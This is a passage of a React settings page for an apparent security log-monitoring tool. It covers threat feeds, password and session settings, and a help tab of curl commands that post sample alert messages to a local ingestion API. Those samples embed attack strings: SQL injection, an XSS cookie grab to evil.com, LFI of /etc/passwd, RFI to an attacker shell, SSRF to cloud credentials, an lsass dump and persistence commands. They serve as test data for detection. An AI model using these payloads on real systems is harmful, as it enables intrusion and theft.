                      <PasswordInput id={`feed-key-${feed.id}`} value={feed.apiKey} onChange={(v) => { const updated = [...threatFeeds]; updated[i] = { ...updated[i], apiKey: v }; setThreatFeeds(updated); updateThreatFeedApiKeyAction(feed.id, v) }} placeholder="API Key" />
                    </div>
                    <Switch checked={feed.enabled} onCheckedChange={(checked) => handleToggleFeed(feed.id, i, checked)} />
                    <button onClick={() => handleRemoveFeed(feed.id, i)} className="p-1 rounded hover:bg-foreground/10 transition-colors text-muted-foreground/40 hover:text-foreground/60">
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
          <div className="flex flex-col gap-2">
            <span className="text-[11px] text-muted-foreground font-medium">Add Feed</span>
            <div className="flex items-end gap-2">
              <div className="flex flex-col gap-1 flex-1">
                <Input value={newFeedName} onChange={(e) => setNewFeedName(e.target.value)} placeholder="Feed name" className="bg-background/60 border-border/50 h-8 text-xs focus:border-foreground/30 placeholder:text-muted-foreground/40" />
              </div>
              <div className="flex flex-col gap-1 flex-[2]">
                <Input value={newFeedUrl} onChange={(e) => setNewFeedUrl(e.target.value)} placeholder="https://api.example.com/v1/" className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30 placeholder:text-muted-foreground/40" />
              </div>
              <Button size="sm" variant="ghost" className="h-8 px-3 text-xs text-muted-foreground hover:text-foreground shrink-0" onClick={handleAddFeed}>
                <Plus className="w-3.5 h-3.5 mr-1" />Add
              </Button>
            </div>
          </div>
        </SectionCard>
      </TabsContent>

      {/* Authentication */}
      <TabsContent value="auth" className="mt-4 flex flex-col gap-5">
        <SectionCard title="Change Password" description="Update the admin account password" icon={User}>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Current Password</Label>
              <PasswordInput id="currentPassword" value={currentPassword} onChange={setCurrentPassword} placeholder="Enter current password" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">New Password</Label>
              <PasswordInput id="newPassword" value={newPassword} onChange={setNewPassword} placeholder="Enter new password" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Confirm Password</Label>
              <PasswordInput id="confirmPassword" value={confirmPassword} onChange={setConfirmPassword} placeholder="Confirm new password" />
            </div>
          </div>
          <div className="flex justify-end">
            <Button size="sm" className="h-8 text-xs bg-foreground text-background hover:bg-foreground/90" onClick={handlePasswordChange} disabled={saving === "password"}>
              {saving === "password" ? <Loader2 className="w-3.5 h-3.5 mr-1.5 animate-spin" /> : <Lock className="w-3.5 h-3.5 mr-1.5" />}
              Update Password
            </Button>
          </div>
        </SectionCard>

        <SectionCard title="Session Management" description="View and manage active sessions" icon={Shield}>
          <div className="bg-background/40 rounded-md border border-border/20 divide-y divide-border/20">
            <div className="flex items-center justify-between px-3 py-2.5">
              <div className="flex items-center gap-3">
                <div className="flex items-center justify-center w-7 h-7 rounded-md bg-foreground/5 border border-border/30">
                  <User className="w-3.5 h-3.5 text-foreground/60" />
                </div>
                <div className="flex flex-col gap-0.5">
                  <span className="text-xs text-foreground/80">admin</span>
                  <span className="text-[10px] text-muted-foreground">Current session</span>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <span className="w-1.5 h-1.5 rounded-full bg-foreground/60" />
                <span className="text-[11px] text-muted-foreground">Active</span>
              </div>
            </div>
          </div>
          <p className="text-[11px] text-muted-foreground/60">
            Sessions expire after 7 days of inactivity. Changing your password will invalidate all other sessions.
          </p>
        </SectionCard>
      </TabsContent>

      {/* Help */}
      <TabsContent value="help" className="mt-4 flex flex-col gap-5">

        {/* Endpoint reference */}
        <SectionCard title="API Reference" description="Endpoint, auth, and accepted fields" icon={HelpCircle}>
          <div className="flex flex-col gap-3">
            <div className="bg-background/40 rounded-md p-3 border border-border/20">
              <p className="text-[11px] text-muted-foreground mb-1">Endpoint</p>
              <code className="text-[11px] font-mono text-foreground/70">POST http://localhost:3000/api/v1/logs</code>
              <br/>
              <code className="text-[11px] font-mono text-foreground/50">POST https://your-server:{apiPort}/api/v1/logs</code>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="bg-background/40 rounded-md p-3 border border-border/20">
                <p className="text-[11px] text-muted-foreground mb-1.5">Required headers</p>
                <ul className="text-[11px] font-mono text-foreground/60 space-y-0.5">
                  <li>Content-Type: application/json</li>
                  <li>x-api-key: {apiKey || "sk-beacon-..."}</li>
                </ul>
              </div>
              <div className="bg-background/40 rounded-md p-3 border border-border/20">
                <p className="text-[11px] text-muted-foreground mb-1.5">Accepted body fields</p>
                <ul className="text-[11px] text-muted-foreground space-y-0.5">
                  <li><span className="font-mono text-foreground/70">message</span> · required (alias: msg, log)</li>
                  <li><span className="font-mono text-foreground/70">source</span> · optional (alias: host)</li>
                  <li><span className="font-mono text-foreground/70">severity</span> · critical|high|medium|low|info</li>
                  <li><span className="font-mono text-foreground/70">timestamp</span> · ISO 8601 (alias: time)</li>
                </ul>
              </div>
            </div>
          </div>
        </SectionCard>

        {/* Web Server Attacks */}
        <SectionCard title="Web Server Attacks" description="SQL injection, XSS, LFI, RFI, scanners — severity auto-detected from message" icon={HelpCircle}>
          <div className="flex flex-col gap-2">
            <CurlExample label="SQL Injection — UNION SELECT" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ModSecurity SQL Injection attack detected uri=/api/users?id=1 UNION SELECT 1,2,username,password FROM admin_users-- src=203.0.113.55\\"}"`} />
            <CurlExample label="SQL Injection — DROP TABLE / stacked" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ALERT SQL injection blocked: POST /login payload=admin'--; DROP TABLE users-- src_ip=45.33.32.156 status=403\\"}"`} />
            <CurlExample label="XSS — reflected script injection" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"XSS attempt: GET /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script> src=198.51.100.10 blocked\\"}"`} />
            <CurlExample label="LFI — Local File Inclusion" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"LFI attack: GET /index.php?page=../../../../etc/passwd HTTP/1.1 403 src=45.33.32.156 ua=Nikto\\"}"`} />
            <CurlExample label="RFI — Remote File Inclusion" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"RFI exploit attempt: GET /page.php?url=http://attacker.ru/shell.php?cmd=id src=91.121.87.45 blocked\\"}"`} />
            <CurlExample label="Web shell upload attempt" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Web shell upload detected: POST /upload filename=shell.php.jpg PHP eval() found in binary src=185.220.101.10\\"}"`} />
            <CurlExample label="Nikto web scanner" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Nikto scanner detected ua=Nikto/2.5.0 src=45.33.32.156 requests=2847 paths=/admin /phpMyAdmin /wp-login.php /.env rate-limited\\"}"`} />
            <CurlExample label="SSRF — internal service probe" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"SSRF exploit: POST /api/fetch url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ src=203.0.113.77 blocked\\"}"`} />
          </div>
        </SectionCard>

        {/* Authentication Attacks */}
        <SectionCard title="Authentication & Credential Attacks" description="Brute force, spray, stuffing, Kerberos attacks" icon={HelpCircle}>
          <div className="flex flex-col gap-2">
            <CurlExample label="SSH brute force" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"SSH brute force: 347 failed login attempts user=root from 198.51.100.22 in 8 minutes\\"}"`} />
            <CurlExample label="AD password spray" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=4625 Logon Type=3 failed for multiple accounts: administrator finance_admin svc_backup from src=10.0.4.12 in 2 minutes - password spray\\"}"`} />
            <CurlExample label="Account lockout" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=4740 Account locked out user=finance_admin after 5 failed attempts src_ip=10.0.4.12 lockout_duration=30min\\"}"`} />
            <CurlExample label="Credential stuffing — web" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Credential stuffing: POST /login 1240 requests in 3min success_rate=2.1% src=45.33.32.200 ua=python-requests rate-limit triggered\\"}"`} />
            <CurlExample label="Kerberoasting attack" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Kerberoasting detected: 47 TGS-REQ for RC4-encrypted service tickets from user=jdoe src=10.0.2.88 EventID=4769 in 30sec\\"}"`} />
            <CurlExample label="Golden Ticket" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Kerberos anomaly: TGT lifetime >10h for user=svc_backup possible golden ticket attack EventID=4769 src=10.0.2.88\\"}"`} />
            <CurlExample label="Pass-the-Hash" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Pass-the-Hash: NTLM auth without interactive logon user=CORP\\\\administrator src=10.0.2.88 dst=10.0.1.15 EventID=4624 LogonType=3\\"}"`} />
          </div>
        </SectionCard>

        {/* Endpoint & Malware */}
        <SectionCard title="Endpoint & Malware" description="Process injection, PowerShell, ransomware, persistence" icon={HelpCircle}>
          <div className="flex flex-col gap-2">
            <CurlExample label="PowerShell encoded command" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Suspicious process: powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA... parent=WINWORD.EXE user=jdoe DownloadString IEX\\"}"`} />
            <CurlExample label="Mimikatz / LSASS dump" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ALERT mimikatz sekurlsa lsass dump: procdump64.exe -ma lsass.exe C:\\\\Users\\\\Public\\\\lsass.dmp EventID=10 GrantedAccess=0x1fffff\\"}"`} />
            <CurlExample label="Process injection — LSASS" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ALERT process injection: svchost.exe PID=4412 -> lsass.exe PID=672 credential dump blocked Mimikatz_Memory_Signature\\"}"`} />
            <CurlExample label="Ransomware — mass encryption" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Ransomware: 3420 files renamed .lockbit extension in 90sec proc=update.exe user=jdoe - your files have been encrypted bitcoin ransom\\"}"`} />
            <CurlExample label="Cobalt Strike beacon" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"CobaltStrike beacon detected: traffic 10.0.1.15:49832 -> 198.51.100.44:443 beacon interval=60s jitter=20% c2 command-and-control callback\\"}"`} />
            <CurlExample label="Scheduled task persistence" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=1 schtasks.exe /create /tn SystemHealthCheck /tr powershell.exe -File C:\\\\ProgramData\\\\check.ps1 /sc onstart /ru SYSTEM parent=cmd.exe\\"}"`} />
            <CurlExample label="Registry run key persistence" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=13 Registry HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run value=Updater data=C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\update.exe\\"}"`} />
            <CurlExample label="Macro phishing email" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Quarantined: Invoice_2026.xlsm from billing@quickb00ks-support.com OLE macro AutoOpen() WScript.Shell detected\\"}"`} />
          </div>
        </SectionCard>

        {/* Network & C2 */}
        <SectionCard title="Network, C2 & Exfiltration" description="TOR, DNS tunneling, C2 beacons, data exfiltration" icon={HelpCircle}>
          <div className="flex flex-col gap-2">
            <CurlExample label="TOR exit node" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"TOR exit node connection: src=10.0.1.45 dst=185.220.101.33 bytes_out=2300MB duration=4h - tor network anonymizer\\"}"`} />
            <CurlExample label="DNS tunneling" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"DNS tunneling suspected: client=10.0.6.30 query=MFZGC3TBNVSA.data.update-service.xyz IN TXT entropy=4.8 dns exfiltration unusual long dns record\\"}"`} />
            <CurlExample label="C2 beacon HTTP" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"C2 command-and-control callback: src=10.0.5.77 dst=91.121.87.45 /jquery-3.3.1.min.js beacon interval=60s jitter=15% malleable c2\\"}"`} />
            <CurlExample label="Data exfiltration — large upload" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Unusual outbound data: src=10.0.3.55 dst=104.21.44.7:443 bytes_out=18.4GB in 2h - baseline <100MB/day possible exfiltration\\"}"`} />
            <CurlExample label="SMB lateral movement" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Lateral movement: EventID=5140 Share=C$ user=svc_backup from 10.0.1.100 to 12 hosts in 30min - psexec evil-winrm abnormal\\"}"`} />
            <CurlExample label="Malware domain" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"BLOCKED: Connection to known malware domain evil-payload.ru from src=10.0.5.77 - threat intel Abuse.ch AlienVault OTX\\"}"`} />
          </div>
        </SectionCard>

        {/* Cloud */}
        <SectionCard title="Cloud & Infrastructure" description="AWS, Azure, GCP IAM changes and misconfigurations" icon={HelpCircle}>
          <div className="flex flex-col gap-2">
            <CurlExample label="AWS IAM privilege escalation" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"IAM privilege escalation: eventName=PutRolePolicy user=devops-intern role=lambda-processor added AdministratorAccess region=us-east-1\\"}"`} />
            <CurlExample label="S3 bucket made public" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"S3 ACL breach: PutBucketAcl bucket=corp-finance-reports-2026 new_acl=public-read user=devops-admin - data exposure\\"}"`} />
            <CurlExample label="Azure AD impossible travel" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Impossible travel: user=j.smith@corp.com login New York 09:00 Moscow 09:45 - travel time impossible risk_score=95\\"}"`} />
            <CurlExample label="GCP service account key" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"GCP service account key created: data-processor@prod.iam.gserviceaccount.com by developer@corp.com key_type=USER_MANAGED\\"}"`} />
          </div>
        </SectionCard>

        {/* Clear False Positives */}
        <SectionCard title="False Positives — Routine Activity" description="Normal events that should score low risk" icon={HelpCircle}>
          <div className="flex flex-col gap-2">
            <CurlExample label="Routine DB query" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"SELECT * FROM users WHERE email='admin@example.com' rows=1 duration=12ms user=app_readonly\\"}"`} />
            <CurlExample label="Nightly backup completed" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Backup completed: job=nightly-full target=NAS-01 duration=42min files=182491 size=234GB status=success\\"}"`} />
            <CurlExample label="Normal user login" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Successful authentication user=jdoe src_ip=10.0.1.50 method=Kerberos workstation=WS-050 EventID=4624 LogonType=2\\"}"`} />
            <CurlExample label="Windows Update" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Windows Update KB5034441 installed successfully host=WS-050 version=10.0.19045.4046 initiated_by=wsus-auto\\"}"`} />
            <CurlExample label="Authorized IT admin session" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"RDP session opened user=it-admin src=10.0.0.5 dst=SRV-DB-01 EventID=4624 LogonType=10 change=CHG-2026-0215 authorized\\"}"`} />
            <CurlExample label="Authorized pentest scan" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Vulnerability scan: nessus src=10.0.0.10 target=10.0.0.0/24 policy=Internal authorized_by=CISO change=CHG-2026-0199\\"}"`} />
            <CurlExample label="Normal DNS lookup" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"DNS query: client=10.0.1.50 query=www.microsoft.com type=A response=20.190.159.5 ttl=300\\"}"`} />
          </div>
        </SectionCard>

        {/* Batch example */}
        <SectionCard title="Batch Ingestion" description="Send multiple logs in one request — mix threat types" icon={HelpCircle}>
          <div className="bg-background/40 rounded-md p-3 border border-border/20">
            <pre className="text-[11px] font-mono text-foreground/70 whitespace-pre-wrap overflow-x-auto">{`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "[{\\"message\\":\\"CobaltStrike beacon detected c2 command-and-control callback 198.51.100.44\\"},{\\"message\\":\\"mimikatz lsass dump credential dumping svchost.exe -> lsass.exe\\"},{\\"message\\":\\"SQL injection UNION SELECT username password FROM admin_users src=203.0.113.55\\"},{\\"message\\":\\"DNS tunneling TXT query MFZGC3TBNVSA.update-service.xyz high entropy\\"},{\\"message\\":\\"SELECT * FROM orders WHERE id=42 duration=3ms user=app_readonly\\"}]"`}</pre>
          </div>
        </SectionCard>

      </TabsContent>
    </Tabs>
  )
}
